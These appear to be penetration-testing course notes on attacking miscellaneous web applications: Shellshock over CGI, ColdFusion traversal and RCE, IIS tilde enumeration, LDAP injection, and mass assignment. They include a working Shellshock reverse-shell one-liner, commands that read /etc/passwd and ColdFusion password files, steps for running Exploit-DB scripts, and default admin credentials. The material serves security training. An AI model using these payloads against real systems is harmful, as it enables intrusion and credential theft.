# Miscellaneous Applications

In this section, we will discuss the following technologies:
- Common Gateway Interface (CGI) Applications - Shellshock
- ColdFusion
- IIS Tilde
- LDAP
- Web Mass Assignment
- Other Notable Applications

##  Common Gateway Interface (CGI) Applications - Shellshock

A Common Gateway Interface (CGI) is used to help a web server render dynamic pages and create a customized response for the user making a request via a web application. CGI applications are primarily used to access other applications running on a web server. CGI is essentially middleware between web servers, external databases, and information sources. CGI scripts and programs are kept in the /CGI-bin directory on a web server and can be written in C, C++, Java, PERL, etc. CGI scripts run in the security context of the web server.

**Shellshock via CGI**

It is a security flaw in the Bash shell (GNU Bash up until version 4.3) that can be used to execute unintentional commands using environment variables.
````
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
````

**Enumeration**
````
$ gobuster dir -u http://<IP>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
````
**Exploitation**
````
$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://<IP>/cgi-bin/access.cgi
$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<Our_IP>/<Our_Port> 0>&1' http://<IP>/cgi-bin/access.cgi
````

## ColdFusion

ColdFusion is a programming language and a web application development platform based on Java. It is used to build dynamic and interactive web applications that can be connected to various APIs and databases such as MySQL, Oracle, and Microsoft SQL Server. ColdFusion Markup Language (CFML) is the proprietary programming language used in ColdFusion to develop dynamic web applications. It has a syntax similar to HTML, making it easy to learn for web developers. CFML includes tags and functions for database integration, web services, email management, and other common web development tasks. Its tag-based approach simplifies application development by reducing the amount of code needed to accomplish complex tasks.

| Benefits                                | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
|-----------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Developing data-driven web applications | ColdFusion allows developers to build rich, responsive web applications easily. It offers session management, form handling, debugging, and more features. ColdFusion allows you to leverage your existing knowledge of the language and combines it with advanced features to help you build robust web applications quickly.                                                                                                                                                                                                                                                                                       |
| Integrating with databases              | ColdFusion easily integrates with databases such as Oracle, SQL Server, and MySQL. ColdFusion provides advanced database connectivity and is designed to make it easy to retrieve, manipulate, and view data from a database and the web.                                                                                                                                                                                                                                                                                                                                                                                |
| Simplifying web content management      | One of the primary goals of ColdFusion is to streamline web content management. The platform offers dynamic HTML generation and simplifies form creation, URL rewriting, file uploading, and handling of large forms. Furthermore, ColdFusion also supports AJAX by automatically handling the serialisation and deserialisation of AJAX-enabled components.                                                                                                                                                                                                                                                           |
| Performance                             | ColdFusion is designed to be highly performant and is optimised for low latency and high throughput. It can handle a large number of simultaneous requests while maintaining a high level of performance.                                                                                                                                                                                                                                                                                                                                                                                                                 |
| Collaboration                           | ColdFusion offers features that allow developers to work together on projects in real-time. This includes code sharing, debugging, version control, and more. This allows for faster and more efficient development, reduced time-to-market and quicker delivery of projects.                                                                                                                                                                                                                                                                                                                                             |


ColdFusion exposes a fair few ports by default:
| Port Number | Protocol       | Description                                                                                                                                                                                                 |
|-------------|---------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 80          | HTTP          | Used for non-secure HTTP communication between the web server and web browser.                                                                                                                              |
| 443         | HTTPS         | Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.                                                               |
| 1935        | RPC           | Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.                                      |
| 25          | SMTP          | Simple Mail Transfer Protocol (SMTP) is used for sending email messages.                                                                                                                                    |
| 8500        | SSL           | Used for server communication via Secure Socket Layer (SSL).                                                                                                                                                |
| 5500        | Server Monitor| Used for remote administration of the ColdFusion server.                                                                                                                                                     |

**Enumeration**

| Method          | Description                                                                                                                                                                                                                                           |
|-----------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Port Scanning   | ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically.           |
| File Extensions | ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.                                                                     |
| HTTP Headers    | Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.                                    |
| Error Messages  | If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.                                                                                                         |
| Default Files   | ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.                                 |


````
$ nmap -p- -sC -Pn 10.129.247.30 --open
8500/tcp  open  fmtp
````
Navigating around the structure a bit shows lots of interesting info, from files with a clear .cfm extension to error messages and login pages.

**Attacking ColdFusion**
````
$ searchsploit adobe coldfusion
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                       | cfm/webapps/50057.py
Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
````
ColdFusion 8 , and there are two results of interest: The Adobe ColdFusion - Directory Traversal and the Adobe ColdFusion 8 - Remote Command Execution (RCE) results.

**Directory Traversal**
````
http://example.com/index.cfm?directory=../../../etc/&file=passwd
````
CVE-2010-2861 is the Adobe ColdFusion - Directory Traversal exploit discovered by searchsploit. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.
- CFIDE/administrator/settings/mappings.cfm
- logging/settings.cfm
- datasources/index.cfm
- j2eepackaging/editarchive.cfm
- CFIDE/administrator/enter.cfm

These ColdFusion files are vulnerable to a directory traversal attack in Adobe ColdFusion 9.0.1 and earlier versions. Remote attackers can exploit this vulnerability to read arbitrary files by manipulating the locale parameter in these specific ColdFusion files.
````
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
````
````
$ searchsploit -p 14641
$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
$ python2 14641.py <IP> 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
````
**Unauthenticated RCE**

In the context of ColdFusion web applications, an Unauthenticated RCE attack occurs when an attacker can execute arbitrary code on the server without requiring any authentication. This can happen when a web application allows the execution of arbitrary code through a feature or function that does not require authentication, such as a debugging console or a file upload functionality. 
````
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
````
````
$ searchsploit -p 50057
$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
Change IP and Port inside the exploit
$ python3 50057.py 
````

## IIS Tilde Enumeration

IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names (aka the 8.3 format) on some versions of Microsoft Internet Information Services (IIS) web servers. This method takes advantage of a specific vulnerability in IIS, resulting from how it manages short file names within its directories.

The tilde (~) character, followed by a sequence number, signifies a short file name in a URL. Hence, if someone determines a file or folder's short file name, they can exploit the tilde character and the short file name in the URL to access sensitive data or hidden resources.

Assume the server contains a hidden directory named SecretDocuments. When a request is sent to http://example.com/~s, the server replies with a 200 OK status code, revealing a directory with a short name beginning with "s". The enumeration process continues by appending more characters:
````
http://example.com/~se
http://example.com/~sf
http://example.com/~sg
````
Continuing this procedure, the short name secret~1 is eventually discovered when the server returns a 200 OK status code for the request http://example.com/~secret.

Once the short name secret~1 is identified, enumeration of specific file names within that path can be performed, potentially exposing sensitive documents.

For instance, if the short name secret~1 is determined for the concealed directory SecretDocuments, files in that directory can be accessed by submitting requests such as:
````
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/anotherfile.docx
http://example.com/secret~1/somefi~1.txt
````
In 8.3 short file names, such as somefi~1.txt, the number "1" is a unique identifier that distinguishes files with similar names within the same directory. The numbers following the tilde (~) assist the file system in differentiating between files that share similarities in their names, ensuring each file has a distinct 8.3 short file name.

For example, if two files named somefile.txt and somefile1.txt exist in the same directory, their 8.3 short file names would be:
- somefi~1.txt for somefile.txt
- somefi~2.txt for somefile1.txt

**Enumeration**

Tilde Enumeration using IIS ShortName Scanner
- https://github.com/irsdl/IIS-ShortName-Scanner
````
$ java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
````

## LDAP

LDAP (Lightweight Directory Access Protocol) is a protocol used to access and manage directory information. A directory is a hierarchical data store that contains information about network resources such as users, groups, computers, printers, and other devices.

**LDAP Injection**

LDAP injection is an attack that exploits web applications that use LDAP (Lightweight Directory Access Protocol) for authentication or storing user information. The attacker can inject malicious code or characters into LDAP queries to alter the application's behaviour, bypass security measures, and access sensitive data stored in the LDAP directory.

| Input   | Description                                                                                                                                                                                                                          |
|---------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| *       | An asterisk * can match any number of characters.                                                                                                                                                                                    |
| ( )     | Parentheses ( ) can group expressions.                                                                                                                                                                                               |
| \|      | A vertical bar \| can perform logical OR.                                                                                                                                                                                             |
| &       | An ampersand & can perform logical AND.                                                                                                                                                                                               |
| (cn=*)  | Input values that try to bypass authentication or authorisation checks by injecting conditions that always evaluate to true can be used. For example, (cn=*) or (objectClass=*) can be used as input values for a username or password fields. |

LDAP injection attacks are similar to SQL injection attacks but target the LDAP directory service instead of a database.
````
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
````
In this query, $username and $password contain the user's login credentials. An attacker could inject the * character into the $username or $password field to modify the LDAP query and bypass authentication.

If an attacker injects the * character into the $username field, the LDAP query will match any user account with any password. This would allow the attacker to gain access to the application with any password, as shown below:
````
$username = "*";
$password = "dummy";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

$username = "dummy";
$password = "*";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
````

## Web Mass Assignment

Web mass assignment vulnerability is a type of security vulnerability where attackers can modify the model attributes of an application through the parameters sent to the server. Reversing the code, attackers can see these parameters and by assigning values to critical unprotected parameters during the HTTP request, they can edit the data of a database and change the intended functionality of an application.

Ruby on Rails is a web application framework that is vulnerable to this type of attack. The following example shows how attackers can exploit mass assignment vulnerability in Ruby on Rails. Assuming we have a User model with the following attributes:
````
class User < ActiveRecord::Base
  attr_accessible :username, :email
end
````
The above model specifies that only the username and email attributes are allowed to be mass-assigned. However, attackers can modify other attributes by tampering with the parameters sent to the server. Let's assume that the server receives the following parameters.
````
{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
````
Although the User model does not explicitly state that the admin attribute is accessible, the attacker can still change it because it is present in the arguments. Bypassing any access controls that may be in place, the attacker can send this data as part of a POST request to the server to establish a user with admin privileges.

## Other Notable Applications

| Application      | Abuse Info |
|------------------|------------|
| Axis2            | This can be abused similar to Tomcat. We will often actually see it sitting on top of a Tomcat installation. If we cannot get RCE via Tomcat, it is worth checking for weak/default admin credentials on Axis2. We can then upload a webshell in the form of an AAR file (Axis2 service file). There is also a Metasploit module that can assist with this. |
| Websphere        | Websphere has suffered from many different vulnerabilities over the years. Furthermore, if we can log in to the administrative console with default credentials such as `system:manager` we can deploy a WAR file (similar to Tomcat) and gain RCE via a web shell or reverse shell. |
| Elasticsearch    | Elasticsearch has had its fair share of vulnerabilities as well. Though old, we have seen this before on forgotten Elasticsearch installs during an assessment for a large enterprise (and identified within 100s of pages of EyeWitness report output). Though not realistic, the Hack The Box machine Haystack features Elasticsearch. |
| Zabbix           | Zabbix is an open-source system and network monitoring solution that has had quite a few vulnerabilities discovered such as SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and remote code execution. Zabbix also has built-in functionality that can be abused to gain remote code execution. The HTB box Zipper showcases how to use the Zabbix API to gain RCE. |
| Nagios           | Nagios is another system and network monitoring product. Nagios has had a wide variety of issues over the years, including remote code execution, root privilege escalation, SQL injection, code injection, and stored XSS. If you come across a Nagios instance, it is worth checking for the default credentials `nagiosadmin:PASSW0RD` and fingerprinting the version. |
| WebLogic         | WebLogic is a Java EE application server. At the time of writing, it has 190 reported CVEs. There are many unauthenticated RCE exploits from 2007 up to 2021, many of which are Java Deserialization vulnerabilities. |
| Wikis/Intranets  | We may come across internal Wikis (such as MediaWiki), custom intranet pages, SharePoint, etc. These are worth assessing for known vulnerabilities but also searching if there is a document repository. We have run into many intranet pages (both custom and SharePoint) that had a search functionality which led to discovering valid credentials. |
| DotNetNuke       | DotNetNuke (DNN) is an open-source CMS written in C# that uses the .NET framework. It has had a few severe issues over time, such as authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download. |
| vCenter          | vCenter is often present in large organizations to manage multiple instances of ESXi. It is worth checking for weak credentials and vulnerabilities such as this Apache Struts 2 RCE that scanners like Nessus do not pick up. This unauthenticated OVA file upload vulnerability was disclosed in early 2021, and a PoC for CVE-2021-22005 was released during the development of this module. vCenter comes as both a Windows and a Linux appliance. If we get a shell on the Windows appliance, privilege escalation is relatively simple using JuicyPotato or similar. We have also seen vCenter already running as SYSTEM and even running as a domain admin! It can be a great foothold in the environment or be a single source of compromise. |

